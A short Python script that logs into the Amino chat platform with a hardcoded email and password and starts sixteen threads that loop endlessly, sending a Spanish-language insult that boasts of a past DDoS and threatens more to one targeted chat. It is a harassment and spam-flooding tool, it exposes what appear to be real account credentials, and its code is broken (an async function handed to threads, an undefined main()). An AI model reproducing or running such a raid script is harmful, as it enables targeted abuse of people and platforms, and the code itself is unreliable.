import threading
import amino
import asyncio

creds = {
        'email': 'renzoverse@gmail.com',
        'password': 'dr4g6nf6rce',
}

comid = '234960818'
chatid = '03ee80fc-71b4-424e-a9cb-95b89f328a35'

client = amino.Client()
client.login(**creds)
subclient = amino.SubClient(aminoId=comid, profile=client.profile)

async def raid():
        global creds
        global comid
        global chatid
        text = 'QUE DARTH CERDO TE GUSTO EL DDOS DEL OTRO DIA; AVISAME SI QUIERES UN POCO MAS HIJO DE PUTA'
        while True:
                client = amino.Client()
                await client.login(**creds)
                subclient = await amino.SubClient(aminoId=comid, profile=client.profile)
                await subclient.send_message(chatId=chatid, message=text)
                loop = asyncio.get_event_loop()
                loop.run_until_complete(main())


threads = []

for i in range(16):
        t = threading.Thread(target=raid)
        t.daemon = True
        threads.append(t)

for i in range(16):
        threads[i].start()
